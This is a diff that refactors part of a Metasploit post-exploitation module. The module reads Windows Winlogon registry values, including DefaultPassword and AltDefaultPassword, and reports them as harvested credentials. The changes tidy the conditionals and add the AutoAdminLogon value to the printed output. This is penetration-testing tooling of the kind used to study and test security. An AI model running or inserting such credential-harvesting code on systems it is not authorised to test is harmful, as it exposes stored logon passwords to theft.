@@ -1,12 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
@@ -46,8 +45,6 @@ class Metasploit3 < Msf::Post
 
     has_al = 0
 
-    # DefaultDomainName, DefaultUserName, DefaultPassword
-    # AltDefaultDomainName, AltDefaultUserName, AltDefaultPassword
     logon_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"
     al = registry_getvaldata(logon_key, "AutoAdminLogon")        || ''
 
@@ -59,24 +56,16 @@ class Metasploit3 < Msf::Post
     du2 = registry_getvaldata(logon_key, "AltDefaultUserName")   || ''
     dp2 = registry_getvaldata(logon_key, "AltDefaultPassword")   || ''
 
-    if do1 != '' and  du1 != '' and dp1 == '' and al == '1'
+    if do1 != '' && du1 != '' && (dp1 != '' || (dp1 == '' && al == '1'))
       has_al = 1
-      creds << [du1,dp1, do1]
-      print_good("DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
-    elsif do1 != '' and  du1 != '' and dp1 != ''
-      has_al = 1
-      creds << [du1,dp1, do1]
-      print_good("DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
+      creds << [du1, dp1, do1]
+      print_good("AutoAdminLogon=#{al}, DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
     end
 
-    if do2 != '' and  du2 != '' and dp2 == '' and al == '1'
+    if do2 != '' && du2 != '' && (dp2 != '' || (dp2 == '' && al == '1'))
       has_al = 1
-      creds << [du2,dp2,do2]
-      print_good("AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
-    elsif do2 != '' and  du2 != '' and dp2 != ''
-      has_al = 1
-      creds << [du2,dp2,do2]
-      print_good("AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
+      creds << [du2, dp2, do2]
+      print_good("AutoAdminLogon=#{al}, AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
     end
 
     if has_al == 0
